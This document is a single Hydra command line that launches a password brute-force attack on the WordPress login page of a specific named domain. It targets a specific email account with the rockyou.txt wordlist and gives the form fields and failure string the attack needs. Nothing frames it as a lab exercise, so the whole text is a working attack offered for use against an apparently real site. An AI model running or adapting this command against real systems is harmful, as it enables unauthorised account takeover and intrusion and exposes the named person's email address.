hydra -l JEISIM18@GMAIL.COM -P /usr/share/wordlists/rockyou.txt pascualbravo.ingejei.com \
https-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Acceder:F=login_error"
